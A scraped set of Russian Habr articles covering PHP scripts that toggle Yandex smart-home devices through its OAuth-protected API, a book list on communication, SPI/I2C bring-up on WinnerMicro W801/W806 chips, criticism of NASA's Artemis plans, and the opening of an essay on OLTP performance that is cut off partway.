Управление устройствами умного дома Яндекс своими скриптами,3,0,https://habr.com/ru/articles/789200/,"В статье пойдёт речь о самом базовом управлении устройствами умного дома Яндекс - а именно функции включения/выключения, т.к. ничего больше мне не нужно, но из базы довольно легко с помощью документации, научиться управлять и другими свойствами. Может этот материал не на статью вовсе, но вот захотелось поделиться. За код не ругайте сильно - я не настоящий программист. Код будет написан на простейшем PHP.AI: Управление устройствами умного дома своими скриптами на PHPЗачем?Захотелось мне как-то настроить один сценарий, который нельзя сделать через Алису. А что делать в таких ситуациях? Разумеется нужно писать свои скрипты. Если кому интересно - функция выключения обогревателя в пиковый тариф электроэнергии при использовании трёхтарифного счётчика и включения обратно по окончании пикового тарифы, но только в случае, если он был включен до этого.Да, в мире существуют вещи типа Home Assistant, но пока мне лень ставить, да и как-то обходился без него. Пока для себя не осознал, зачем он мне. И кажется там именно такой сценарий всё равно нельзя сделать. Важно включать, только если он до отключения был включен. Если до наступления пикового времени прибор не был включен, то и включать его обратно не надо по завершению пикового времени.Поиск решенийНачать решил с API Яндекса. Благо с этим проблем нет, нашлось довольно быстро:https://yandex.ru/dev/dialogs/smart-home/doc/concepts/platform-quickstart.htmlОднако документация довольно скудна на рабочие примеры. Хорошее дело - прежде чем писать что-то своё, попытаться найти что-то готовое на Github или еще где-то. Честно признаюсь, искал не очень глубоко, но натыкался в основном на варианты, когда нужно наоборот прикрутить свой ""умный дом"" к Алисе, что бы можно было из Алисы управлять им командами.РегистрацияКак сказано в документации, нужно зарегистрироваться в oauth по ссылке https://oauth.yandex.ru/client/new/Важная странность, на которую я потратил бездарно несколько часов. Нужно регистрироваться сразу по ссылке, а не пытаться в дальнейшем в интерфейсе нажимать на кнопку ""создать приложение"" - оно почему-то пытается создать приложение в контексте ""id"", в url видно другую ссылку https://oauth.yandex.ru/client/new/id и в таком случае не получается задать нужные права для будущего приложения.Заполняем данные:Регистрация oauth YandexНазвание любое.Галочка - веб-сервисы.Redirect URI - ссылка, куда будет происходить переадресация после успешной авторизации. В моём случае я использую специально подготовленную веб-страницу на моём сервере, но для начала можно использовать http://oauth.yandex.ru/verification_code - этот URL просто отобразит на странице код, когда будет нужно.Доступ к данным - согласно документации: iot:view, iot:controlПо сути авторизоваться для работы скриптов надо один раз, токен даётся на год, затем его вроде как можно продлять автоматически, функцию для этого я написал, но пока не было возможности проверить.Создаём приложение, заходим в него:Обратим внимание на ClientID и Client secret - они пригодятся. Можно никуда не записывать - они всегда доступны на странице приложения.Получение токенаИз консоли это можно сделать так$ curl ""https://oauth.yandex.ru/authorize?response_type=code&client_id=<client_id>&force_confirm=no&scope=iot:view%20iot:control""
Found. Redirecting to https://passport.yandex.ru/auth?retpath=https%3A%2F%2Foauth.yandex.ru%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D%253Cclient_id%253E%26force_confirm%3Dno%26scope%3Diot%3Aview%2520iot%3Acontrol&noreturn=1&origin=oauthДалее идём в браузере по:https://passport.yandex.ru/auth?retpath=https%3A%2F%2Foauth.yandex.ru%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D%253Cclient_id%253E%26force_confirm%3Dno%26scope%3Diot%3Aview%2520iot%3Acontrol&noreturn=1&origin=oauthАвторизуемся и получаем код - код вы увидите после редиректа на страницу http://oauth.yandex.ru/verification_code , в случае если у вас еще не готова более автоматизированная страница авторизации.Далее с этим кодом, получаем сам токен:curl -H ""Authorization: Basic $(echo -n ""<ClientID>:<Client secret>""|base64 -w 0)"" -d ""grant_type=authorization_code&code=<code>"" ""https://oauth.yandex.ru/token""В ответ вы получите JSON с токеном и некоторыми нужными параметрами:{
  ""token_type"": ""bearer"",
  ""access_token"": ""AQAAAACy1C6ZAAAAfa6vDLuItEy8pg-iIpnDxIs"",
  ""expires_in"": 124234123534,
  ""refresh_token"": ""1:GN686QVt0mmakDd9:A4pYuW9LGk0_UnlrMIWklkAuJkUWbq27loFekJVmSYrdfzdePBy7:A-2dHOmBxiXgajnD-kYOwQ""
}token_type - другого я и не виделaccess_token - тот самый Oauth токенexpires_in - время в секунда до протуханияrefresh_token - токен с которым можно обновить основной токен и вроде как время протухания в том числе.Мой способ получения токена на PHP. Данный файлик (например iot_yandex_auth.php) нужно (при желании) разместить на своем веб сервере. Можно наверное этого и не делать и обойтись авторизацией курлом. Да и вроде функция обновления токена должна по идее работать.Код iot_yandex_auth.php<?php
$client_id=""<client_id>"";
$client_secret=""<client_secret>"";
$file=""private_folder_kae6iev_taex/iot_yandex_token.json"";

function universal_curl($url,$headers,$data = """",$method = """"){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if($method!=""""){
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    }
    if($data!=""""){
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    $result = json_decode($result,true);
    curl_close($ch);
    return $result;
}


if(isset($_GET[""code""])&&is_numeric($_GET[""code""])){
    $auth=base64_encode($client_id."":"".$client_secret);
    $headers=[""Authorization: Basic "".$auth];
    $url=""https://oauth.yandex.ru/token"";
    $data=""grant_type=authorization_code&code="".$_GET[""code""];
    $response=universal_curl($url,$headers,$data);
    if(isset($response[""access_token""])){
        $response[""expires""]=$response[""expires_in""]+time();
        if(file_put_contents($file, json_encode($response))){
            echo ""Success"";
        }
        exit;
    }
}

$url=""https://oauth.yandex.ru/authorize?response_type=code&client_id="".$client_id.""&force_confirm=yes&scope=iot:view%20iot:control"";
header('Location: '.$url);идём на https://ownsite.ru/iot_yandex_auth.phpВ случае если в GET запросе кода нет, страница переадресует куда надо, если есть - то сходит в Яндекс, получит токен и положит в папку на сервере.Обратите внимание, что $client_id и $client_secret надо заполнить, а так же $file при текущем конфиге будет указывать на папку в / вашего сайта. В этом случае файлик будет доступен со всего интернета, хорошо бы прикрыть локацию или как-то сделать более красиво. Можно и нужно еще где-то выше положить, что бы локация была не доступна из интернета в принципе.Еще может быть не очевидно, но нужно, чтоб права позволяли писать в $file вашему веб-серверу и файл не сможет создаться - вы увидите об этом ошибку в errors вашего веб-сервера.Еще при записи JSON в файлик, я добавляю туда параметр expires, т.к. мне не очевидно, что иначе делать с expires_in и как понять, когда именно токен просрочится.Так же эта локация должна быть доступна для скриптов, которые уже непосредственно будут управлять вашим умным домом.УправлениеВсё готово, можно начать управлять.Создаём файлик функций, например functions.php - где-то еще, например в /opt/scripts/smart_homeНе забываем поменять $yandex_iot_client_id, $yandex_iot_client_secret и $yandex_iot_file на актуальные.Код functions.php<?php
$yandex_iot_client_id=""<client_id>"";
$yandex_iot_client_secret=""<client_secret>"";
$yandex_iot_file=""/var/www/ownsite.ru/private_folder_kae6iev_taex/iot_yandex_token.json"";

function universal_curl($url,$headers,$data = """",$method = """"){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    if($method!=""""){
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    }
    if($data!=""""){
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_VERBOSE, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    $result = json_decode($result,true);
    curl_close($ch);
    return $result;
}

function universal_yandex_iot($function,$headers_add = array(),$data = """",$method = """"){
    $iot_api_url=""https://api.iot.yandex.net"";
    $url=$iot_api_url.$function;
    $headers=array_merge(array(""Authorization: Bearer "".get_yandex_iot_token()),$headers_add);
    return(universal_curl($url,$headers,$data,$method));
}

function get_yandex_iot_power_state($device_id){
    $function=""/v1.0/devices/"".$device_id;
    $result=universal_yandex_iot($function);
    if(isset($result[""capabilities""])){
        foreach($result[""capabilities""] as $capability){
            if($capability[""type""]==""devices.capabilities.on_off""){
                if($capability[""state""][""value""]==""""){
                    return(0);
                }elseif($capability[""state""][""value""]==""1""){
                    return(1);
                }else{
                    return(-1);
                }
            }
        }
    }else{
        return(-1);
    }
}

function get_yandex_iot_info(){
    $function=""/v1.0/user/info"";
    $result=universal_yandex_iot($function);
    return($result);
}

function yandex_iot_power_change($device_id,$state){
    $function=""/v1.0/devices/actions"";
    $headers=[""Content-Type: application/json""];
    $data='{""devices"":[{""id"":""'.$device_id.'"",""actions"":[{""type"":""devices.capabilities.on_off"",""state"":{""instance"":""on"",""value"":'.$state.'}}]}]}';
    $result=universal_yandex_iot($function,$headers,$data);
    if(isset($result[""status""])&&$result[""status""]==""ok""){
        return(true);
    }else{
        return(false);
    }
}

function get_yandex_iot_token(){
    global $yandex_iot_file;
    $token=file_get_contents($yandex_iot_file);
    $token_arr=json_decode($token,true);
    if($token_arr[""expires""]-time()<20995200){
        update_yandex_iot_token();
    }
    return($token_arr[""access_token""]);
}

function update_yandex_iot_token(){
    global $yandex_iot_file,$yandex_iot_client_id,$yandex_iot_client_secret;
    $token=file_get_contents($yandex_iot_file);
    $token_arr=json_decode($token,true);
    $url=""https://oauth.yandex.ru/token"";
    $auth=base64_encode($yandex_iot_client_id."":"".$yandex_iot_client_secret);
    $headers=[""Authorization: Basic "".$auth,""application/x-www-form-urlencoded""];
    $data=""grant_type=refresh_token&refresh_token="".$token_arr[""refresh_token""];
    $response=universal_curl($url,$headers,$data);
    if(isset($response[""access_token""])){
        $response[""expires""]=$response[""expires_in""]+time();
        if(file_put_contents($yandex_iot_file, json_encode($response))){
            return(true);
        }
    }else{
        return(false);
    }
}
?>universal_curl - универсальный курлuniversal_yandex_iot - адаптация универсального курла для Яндексаget_yandex_iot_power_state - получение состояния питанияget_yandex_iot_info - получает вообще всю информацию по умному дому, все возможности, device_id и прочее.yandex_iot_power_change - изменение состояния питанияget_yandex_iot_token - получает токен из файла и обновляет (по крайней мере пытается), если время жизни токена меньше чем 8 месяцев.update_yandex_iot_token - обновление токена (попытка). Тут так же при записи JSON в файлик, я добавляю туда параметр expires, т.к. мне не очевидно, что иначе делать с expires_in и как понять, когда именно токен просрочится.Создаём тестовый файл, например yandex_test.php.<?php
require_once('functions.php');

//print_r(get_yandex_iot_info());
//exit;
echo get_yandex_iot_power_state(""<device_id>"").""\n"";
echo yandex_iot_power_change(""<device_id>"",""false"").""\n"";
sleep(1);
echo get_yandex_iot_power_state(""<device_id>"").""\n"";
echo yandex_iot_power_change(""<device_id>"",""true"").""\n"";
?>Включаем-выключаем что-нибудь, радуемся что работает.Дополнительно можно управлять не только питанием, но и другими параметрами изучив документацию https://yandex.ru/dev/dialogs/smart-home/doc/concepts/platform-protocol.html. Мне нужна пока что только функция управления питанием, но имея базу - остальное докрутить не составляет труда.",2024-01-26
"ТОП-5 книг, которые помогут научиться договариваться и выстраивать эффективные коммуникации",4,1,https://habr.com/ru/companies/otpbank/articles/789206/,"Привет, Хабр! Я бизнес-тренер. Мы в ОТП Банке очень любим читать полезные книги и делиться своими наблюдениями с коллегами. Решили, что и с читателями Хабра тоже нужно поделиться. Возможно, кто-то их все уже прочёл, а кто-то нет —  и тогда я буду очень рада, что список пригодился:) Эти книги помогут прокачать soft skills — полезные навыки на пути к большим зарплатам.«Проще говоря: Как писать деловые письма, проводить презентации, общаться с коллегами и клиентами»Джей СалливанЭту книгу стоит прочитать в первую очередь для того, чтобы научиться структурировать свои мысли, а именно — начинать с ключевой мысли, фокусируясь на том, что нужно услышать аудитории. Благодаря ей, вы научитесь рассказывать истории интересно. Автор подробно описал о разных видах коммуникациях: совещаниях, выступлениях, презентациях, об устной и письменной речи. Будет полезна абсолютно каждому. «Мы обращаемся к людям со своей, а не с их колокольни. А когда слушаем, пропускаем информацию через собственные фильтры, делая предположения и слыша идеи, обусловленные нашим личным опытом»«Ложь: Почему говорить правду всегда лучше» Сэм ХаррисЭта книга небольшого размера и читается очень быстро. При этом она содержит много ценной информации. Казалось бы, все и так знают, что обманывать — это плохо. Но не все перестают это делать. Почитайте, возможно, на вас она сможет оказать свое влияние и после ее прочтения врать перехочется.«Если мы перестанем лгать о том, что у нас все в порядке, то нам уже не удастся губить свою жизнь в тайне от окружающих»   «Как узнать все что нужно, задавая правильные вопросы»Фрэнк СесноЧто общего между политиками, журналистами и работниками правоохранительных органов? Они умеют задавать правильные вопросы и получать нужную информацию. Этому может научиться каждый. Начать можно с книги Фрэнка Сесно. Она наполнена примерами разных специалистов. Важно: после прочтения обязательно практикуйтесь.«Чтобы задать правильный вопрос в правильный момент правильному человеку и понять, что делать с полученным ответом, требуются размышления, умение, практика и иногда удача»   «Я слышу вас насквозь. Эффективная техника переговоров»Марк ГоулстонНам всегда что-то нужно от других, — начиная с наших супругов и родителей, заканчивая начальником и коллегами. Убедить кого-то — значит начать с ним переговоры. Что нужно сделать, чтобы они прошли успешно? Ведь от результата может зависеть многое, в том числе качество вашей жизни. Ответ — научиться слушать и слышать собеседника. Автор рассказывает, как развить в себе этот навык и научиться применять его в жизни. Полезно как для работы, так и для личной жизни. «Все дело в том, что вы, скорее всего, знаете намного меньше, чем думаете, о тех людях, с которыми хотите установить контакт, независимо от того, познакомились вы минуту назад или провели рядом много лет. То, что вы, как вам кажется, знаете о них, может оказаться совершенно неверным»   «Психология влияния»Роберт Б. ЧалдиниКлассика, бестселлер, настольная книга маркетологов, политиков — да всех желающих убеждать и добиваться своего. В ней множество инструментов, которые каждый может применить без труда. Но самое важное, прочитав книгу, вы сразу вспомните случаи, когда попадались на чьи-то манипуляции. Однако после прочтения вы научитесь говорить на такое твердое «нет».«Мы чаще остаемся верными своим решениям, если заявляем о них публично»Поделитесь в комментариях своими литературными находками:) Что вам помогло научиться грамотно и эффективно коммуницировать? ",2024-01-26
"WinnerMicro Wi-Fi SoC W801/W806 (SPI, I2C – дисплей и температура)",3,0,https://habr.com/ru/articles/789196/,"Пробуем завести SPI и I2C на китайском чипе WinnerMicro Wi-Fi SoC W801/W806. Подключение дисплея на ST7789 и датчика температуры и влажности AHT10. ПодготовкаКачаем отсюда CDK (IDE)Регистрация бесплатная, быстрая – только по почте. Скачивается быстро.Гиты с SDK. Отличия в модуле RF и в некоторых пинах (см. в Литература и прочее). Для 806Для 801Подготовка программатора cklink-lite (если нет)В качестве отладчика можно использовать BluePill STM32(STM32F103C8T6). Качаем этот проект:GitHubИ, нужно зашить CKLinkLite2.30.hex в плату. Можно это сделать стандартными STM32 Utility или Cube Programmer. Стоит заменить драйвер через Zadig, иначе IDE будет ругать вас и грозить пальчиком. Меняем на libusbПодключение STM32 к W806/801 следующее:Подключаем самоделкин программаторНе уверен, что nRESET подключен правильно, т.к сброса не происходит по кнопке, но отлаживать можно. Чтобы IDE правильно готовила прошивки, нужно воспользоваться файлом W806_Flash_Tool.elfЗаходим во вкладку Flash Management в IDEНажимаем AddВыбираем скачанный ранее файлИ перед закрытием окна, нужно по нему кликнуть. В нижнем окне должен отобразиться выбранный файл.Далее, во вкладку Configure Flash ToolНажимаем AddВыбираем добавленный ранее драйвер, кликаем AddОн должен отобразиться вот таким образом в окне устройствДалее – в этом же окне переходим во вкладку Debug и жмем Settings…И выставляем галочку Download to FlashЗашиваем – все прошло гладко. Код адекватно загружается и останавливается на брейкпоинтах.ОграниченияВот такое окно может вылезать при ребуте программатора. Видимо, какой-то сервис не отпускает драйвер.Такое лечится переустановкой драйвера в ручную. Диспетчер устройств->двойной клик по программатору->Драйвер->Обновить драйвер->Найти на этом компьютере->Выбрать драйвер из списка доступных. Там будет парочка. Я тыкаю любой, проблема исчезает до следующего перезапуска. Как говорили классики кинематографа: “А большего мне и не надо!”. При использовании 806 на 801 прошивка не сохраняется после перезагрузки. Не разбирался, не интересно.После заливки прошивка может не стартануть – нужно зайти в отладку, потом будет нормально.Это все, что нужно для начала работы.Заводим SPI на W806/W801Для открытия проекта со всеми зависимостями, нужно открыть что-то вроде подобного в папке SDK.WM_SDK_W806\tools\W806\projects\SDK_Project\project\CDK_WSПробуем поднять SPI. Узнаем, что их несколько – обычный(LSPI), скоростной(HSPI) и QSPI.Нам нужен LSPI. Открываем Chip Specifications W801 Видим, что LSPI можно ремапить на следующие ножки порта B:23 – CS (NSS)24 – CK (CLK)25 – MISO26 – MOSIПишем инициализацию.static HAL_StatusTypeDef SPI_Init(SPI_HandleTypeDef *hspi){
    SPI_InitTypeDef spi;
    HAL_StatusTypeDef ret = HAL_OK;
    //__HAL_AFIO_REMAP_SPI_CS(GPIOB, GPIO_PIN_4); hardware NSS disabeled
    __HAL_AFIO_REMAP_SPI_CLK(GPIOB, SPI_SCL);
    //__HAL_AFIO_REMAP_SPI_MISO(GPIOB, SPI_MISO);
    __HAL_AFIO_REMAP_SPI_MOSI(GPIOB, SPI_MOSI);

    
    hspi->Init.Mode = SPI_MODE_MASTER;
    hspi->Init.CLKPolarity = SPI_POLARITY_HIGH;
    hspi->Init.CLKPhase = SPI_PHASE_1EDGE;
    hspi->Init.NSS = SPI_NSS_SOFT;
    hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
    hspi->Init.FirstByte = SPI_LITTLEENDIAN;
    
    hspi->Instance = SPI;
    
    ret = HAL_SPI_Init(hspi);
    return ret;

}В main вызываем эту функцию и пробуем отправить ( HAL_SPI_Transmit(&hspi1, data, 5, 10000); ) и… тишина.Проверил код HAL_SPI_Init – все в порядке. Посмотрел какие нужны регистры для работы LSPI – нет ли регистра ENABLE. Нет, все нормально. Может нужно инициализировать ножки? Попробовал – нет. Посмотрел регистр питания – там ничего нет про периферию. Тактирование смотрел в последнюю очередь(не делайте так), т.к. глаз зацепился за эту фразу при беглом осмотре документации:В итоге решил вычитать Software Clock Gating Enable Register (HR_CLK_BASE_ADDR) по адресу 0x40000E00 и увидел, что клоки отключены! Включены только для gpio и uart. Первая же функция(SystemClock_Config(CPU_CLK_160M)) выключила всю периферию!Включаем!В Register Manual видим, что нужно установить 1 сюда:i2cspiТо есть по маске 0x80 и 0x01 в HR_CLK_BASE_ADDR. *((uint32_t *)(HR_CLK_BASE_ADDR)) |= CLK_GATE_SPI_MASK|CLK_GATE_I2C_MASK;И, о чудо, тестовая строка побежала! Пробуем функции от библиотеки дисплея – работает.SPI – пишем в драйвер дисплея:Хочу заметить, что если сконфигурировать SPI в BIGENDIAN, то HAL-функция будет работать отвратительно – она для этого не предназначена.Заводим I2C на W806/W801Добавляем инициализацию I2Cstatic HAL_StatusTypeDef I2C_Init(I2C_HandleTypeDef *hi2c){
    HAL_StatusTypeDef ret = HAL_OK;
    __HAL_AFIO_REMAP_I2C_SCL(GPIOB, I2C_SCL);
    __HAL_AFIO_REMAP_I2C_SDA(GPIOB, I2C_SDA);
    hi2c->Frequency = 100000;
    hi2c->Instance = I2C;
    ret = HAL_I2C_Init(hi2c);
    return ret;
}Сама функция HAL выглядит похоже на STMовскую, но передаваемые параметры немного другие. Немного это меня задержало – не посмотрел сразуВот пример отличия:HAL_StatusTypeDef HAL_I2C_Write(I2C_HandleTypeDef *hi2c, uint8_t DevAddress, uint8_t MemAddress, uint8_t *pData, uint16_t Size); //W800
HAL_StatusTypeDef HAL_I2C_Master_Transmit (I2C_HandleTypeDef* hi2c, uint16_t DevAddress, uint8_t* pData, uint16_t Size, uint32_t Timeout); //STM32I2C – запрос на чтение с датчика AHT10Ответ от датчика AHT10ИтогиДобавил простое рисование факториала в проект и смотрю как рисуется.Рисуем множество Мандельброта:Пара тестовых видео:Проект на GitHubЛитература и полезное прочееЗдесь показано как изображения конвертироватьСкрипт на питоне для перевода вывода программы LCD image converter в вид двумерного массива, который удобно использовать в header’ах.file1 = open('inp_file.txt', 'r')
file2 = open('test_out.txt', 'w+')
count = 0
file2.write(""const uint16_t test_img[][240] = {"")
while True:
    line = file1.readline()
    if not line:
        file2.write(""};"")
        break
    if count != 0:
        file2.write("","")
    count += 1
    file2.write(""{"" + line + ""}"")
file2.close()
file1.close()Практически вся нужная информация по чипам собрана в этом репозиторииGitHubСсылка на китайские даташиты на W801Тут есть про отличия и подключениеГит с драйвером дисплея на st7789 для STM32GitHubПро отладчикВидос (на китайском) как чел подключает свой программатор на  STM32F103 и настраивает запуск отладки (自制CKlink阿里平头哥w801/w806仿真器DIY全教程)Программаторы самодельные с инструкциями на китайском с готовыми схематиками и разводками:https://oshwhub.com/jiaminghui98/mini-CKLinkhttps://oshwhub.com/l88889686/cklinkw80x-fang-zhen-qiПолу-переведенный даташит на английский на W806:W806_-1СкачатьПро 806 на easyelectronicsНа другом сайте про W806/W801 с полезными ссылками",2024-01-26
"Экс-руководитель NASA считает, что программу полёта на Луну Artemis нужно перезапустить",4,1,https://habr.com/ru/companies/ru_mts/articles/789142/,"Человечество уже несколько десятков лет хочет снова высадиться на Луну — не в плане выгрузки робота, а именно полёта на естественный спутник Земли космического аппарата с командой на борту. Как уже сообщалось на Хабре, представители NASA заявили, что сразу два важных этапа возвращения человека на Луну переносятся на год.Так, облёт Луны с экипажем состоится в сентябре 2025 года, а не в конце 2024, а высадка человека на лунную поверхность перенесена на сентябрь 2026 года. Речь о миссиях Artemis II и Artemis III соответственно. Некоторые специалисты полагают, что ничего хорошего не получится и на этот раз, заявляя о том, что сама программа неудачная. Одним из её критиков является бывший руководитель NASA Майкл Гриффин. Подробности — под катом.Что именно критикует Гриффин?Во время выступления в подкомитете Палаты представителей в январе 2024 года Гриффин заявил, что NASA должна перезагрузить программу Artemis, избавившись от ненадёжных коммерческих партнёров. По мнению Гриффина, именно эти компании и становятся причиной постоянного переноса сроков реализации лунной миссии.Так, программа предусматривает помощь сторонних подрядчиков, т. е. в ней используются не только оборудование и технологии от NASA. И действительно, за систему высадки отвечает команда SpaceX. Компания Илона Маска разрабатывает способ доставки астронавтов на поверхность естественного спутника Земли.А именно — специальную версию посадочного модуля ракеты Starship Human Landing System для миссий Artemis III и IV. SpaceX предстоит испытать большое количество элементов и технологий, включая достижение дальней лунной орбиты, обеспечение дозаправки в космосе и в конечном счёте возможность совершить безопасную и мягкую посадку на поверхность Луны.По словам Гриффина, система взаимодействия NASA с подрядчиками чрезмерно сложная. Из-за этого ухудшается эффективность работы всего проекта, а риск негативного влияния задержек на общий прогресс программы растёт.Критикуя, предлагай?Гриффин предлагает более консервативный подход, когда программой занимаются NASA и несколько традиционных подрядчиков — Boeing, Lockheed Martin и Northrop Grumman.По его мнению, такая схема позволит подготовить и реализовать к 2029 году:два запуска ракеты Space Launch System Block IIразгонный блок Centaur IIIкосмический корабль «Орион»двухступенчатый лунный посадочный модуль с запасным топливомОн считает, что всё это даст возможность экипажу из четырёх человек пробыть на поверхности Луны в течение семи дней. Но, что удивительно, этот план, вернее, очень на него похожий, Гриффин уже представлял ранее, в то время, когда был руководителем NASA. План проанализировали независимые эксперты, и, по их мнению, он неосуществим.Просто потому, что этот проект предусматривает готовность двух SLS Block II к 2029 году. И это в то время, когда разработка Block I заняла 12 лет и стоила 30 млрд долларов США. И даже в этом случае проект будет завершён лишь в 2028 году. А здесь вторая версия ракеты-носителя, с более мощными боковыми ускорителями, и предполагается, что сразу два таких аппарата будет готово к 2029 году.Ещё одна проблема — посадочный лунный модуль. Дело в том, что по нему даже проекта нет, как и финансирования. Лишь по предварительным подсчётам его создание заняло бы около 10 лет времени и от $10 до $20 млрд.Тем не менее в плане экс-руководителя агентства есть и разумные моменты. Так, он вполне аргументированно считает, основываясь на сотрудничестве подрядчика в рамках «Ориона» (в разработке с 2005 года) и ракеты SLS, что если бюджет NASA увеличится примерно вдвое, люди смогут высадиться на Луну к концу 2030-х годов. С этим согласны многие эксперты.Сейчас руководство агентства заявляет, что новые переносы — попытка повысить безопасность экипажа. В документе сообщается, что каждая последующая пилотируемая миссия добавляет лётных проверок для новых систем. Ну а поскольку в проекте планируется использовать помощь сторонних подрядчиков, включая SpaceX и Blue Origin, то в целом всё достаточно сложно.По словам Билла Нельсона, директора NASA, человечество возвращается на Луну путём, который никогда не использовался ранее, ну а безопасность экипажа — приоритет агентства в рамках всего проекта.При всём при этом программу нельзя назвать провальной, поскольку беспилотная миссия, реализованная с задействованием космического корабля Orion, прошла штатно. Запуск аппарата выполнен при помощи впервые использованной сверхтяжёлой ракеты-носителя Space Launch System (SLS).Сейчас команда проекта исправляет выявленные неполадки, включая аккумуляторную батарею и модуль, который отвечает за вентиляцию воздуха и контроль температуры. Для беспилотной миссии всё это не является критически важной проблемой, но если к спутнику Земли полетят люди, недостатки нужно исправить.Так что, всё плохо?С планом самого Гриффина, насколько можно судить, да. Но с текущей программой NASA и реализуемым по ней проектом всё намного лучше. Если администрации агентства удастся избежать дальнейших задержек, то лунная программа вполне может быть реализована, пусть и с отсрочками, о которых заявлялось выше. «Перезагрузка» Artemis вряд ли сделает ситуацию лучше.Ранее уже приводилось мнение и отечественных специалистов, включая научного сотрудника ИМЭМО РАН Александра Ермакова, переносы объясняются в том числе сложностью технического выполнения проекта: «В целом, реализуемая программа куда более амбициозна, чем “Аполлон” в 1960–1970-е гг., так как кроме полётов включает и начало строительства аванпоста на поверхности и станции на орбите, предполагает несравненно более мощные транспортные возможности, декларируется практически старт колонизации Луны. Но ресурсов относительно планов выделяется мало, и, учитывая это, замысел выглядит слишком оптимистично».",2024-01-26
Оценка потенциальной производительности информационных систем на задачах OLTP,3,0,https://habr.com/ru/articles/789074/,"Все мы сегодня наблюдаем неприятное явление деградации эффективности ПО. Эффективность проседает во всём, от пользовательского интерфейса и до того, в чём компьютеры, вроде бы, просто обязаны быть самыми быстрыми, то есть в массовых задачах повседневной обработки информации.Решение задачи повышения производительности ПО не может быть получено без понимания, а на что мы в принципе можем рассчитывать? Именно такую отправную точку и предлагается рассмотреть в данном тексте.Далее показаны потенциальные возможности ПО на самых массовых на сегодня задачах, заключающихся во взаимодействии оператора с информационными системами. Англоязычное название этой группы задач - on-line transaction processing (OLTP). К этому классу, в том числе, относится всё взаимодействие с браузером, которые представляют клиентскую часть системы. За кадром, невидимая для операторов, остаётся почти чистая задача параллельной обработки множества запросов.Заметим, что для ИТ систем нет разницы, кто с ними взаимодействует - клиент (покупатель) или работник фирмы, поэтому всех пользователей для общности подхода далее будем называть операторами, независимо от вида клиентского ПО, будь то браузер, настольный ""толстый"" клиент или мобильное приложение.Но не все операторы равны. Поэтому выделим целевую группу, убрав из неё лишнее. Здесь мы не будем рассматривать аналитико-управленческую часть, а так же игровую или развлекательную. В таких областях взаимодействие с ИТ системами весьма разнообразно и достаточно сложно, но охватить всё и сразу у нас точно не получится.Определим точнее предмет исследования. Нас интересует оператор, участвующий в коллективном процессе и выполняющий в нём узко специализированные действия. Пример знакомый каждому - интернет-магазин. В магазине покупатель задаёт начальные параметры для дальнейшего процесса обработки товаров или услуг. Далее уже другие участники процесса принимают на себя задачу по достижению общей цели. Кто-то везёт груз, кто-то отвечает на звонки, кто-то следит за синхронностью работы других участников. В целом же ИТ система обеспечивает нужной информацией всех участников в нужное время, а участники дополняют информацию в системе новыми данными о своих действиях.Обобщённо модель данных рассматриваемого класса ИТ систем можно представить в виде набора операций, совершаемых операторами на основе некой справочной информации, как о состоянии общего процесса, так и о допустимых вариантах дальнейших действий. Поскольку процесс распределён в пространстве и во времени, данные придётся хранить долго и надёжно, а так же передавать на большие расстояния.Из сказанного вытекают следующие задачи:ввод и передача информации от операторахранение информациидоступ операторов к информации, определяющей их действияпреобразование информации в удобную для операторов формуРассмотрим эти задачи с точки зрения производительности ИТ системПотребность в передаче данных в целом на сегодня удовлетворяется вполне качественно, то есть без потери информации. Основной способ достижения качества - повторная передача в случае проблем при доставке. Требуемое количество повторов обычно небольшое и они не сказываются критическим образом на производительности. Точно так же сама передача по сети не является ограничением производительности в большинстве задач, поскольку для множества задач доступных на сегодня миллисекундных времён на передачу данных вполне достаточно для связи оператора с центральным сервером. Поэтому в дальнейшем мы не будем рассматривать передачу данных подробно, хотя остановимся на загрузке сервера сетевым взаимодействием.Задачи ввода и отображения данных обычно решаются на так называемых ""клиентских"" компьютерах, которые сегодня имеют более чем достаточные вычислительные ресурсы для достижения рассматриваемых нами целей (ввод данных оператором, отображения полученных с сервера). Здесь опять нет препятствий для производительности, если таковыми не считать желание разработчиков сэкономить время разработки. Последний момент мы так же не учитываем, ведь речь идёт о потенциальной производительности, то есть без учёта количества времени, потраченного на её достижение. Этот момент может вызвать негодование у финансистов, не готовых оплачивать неопределённо большие интервалы времени на разработку, но стоит понимать, что в большинстве случаев время, достаточное для получения результатов, близких к потенциально возможным, не столь велико, как это могло бы показаться неопытным в разработке финансистам.Без клиентской части оставшаяся группа задач возлагается на специально выделенные компьютеры, называемые серверами. На сервер поступают запросы от клиентов, сервер ищет необходимую для обработки запроса информацию, обрабатывает её и отправляет клиенту. Взаимодействие серверов так же укладывается в схему клиент-сервер, но у же с полностью электронным оператором. Поскольку сервер должен обработать очень много запросов главные проблемы с производительностью в подавляющем большинстве случаев присутствуют именно на стороне сервера. Компьютер оператора имеет дело лишь с одним оператором и его небыстрыми (по меркам компьютеров) действиями. Серверу же приходится трудиться для миллионов клиентов (в экстремальных случаях, разумеется). Обработка одного запроса может занимать миллисекунду, но когда запросов миллион, потребуется 1000 секунд времени работы сервера для обслуживания всех запросов от миллиона клиентов за секунду реального времени.Но соотношение из примера выше - 1 к 1000 - значительно 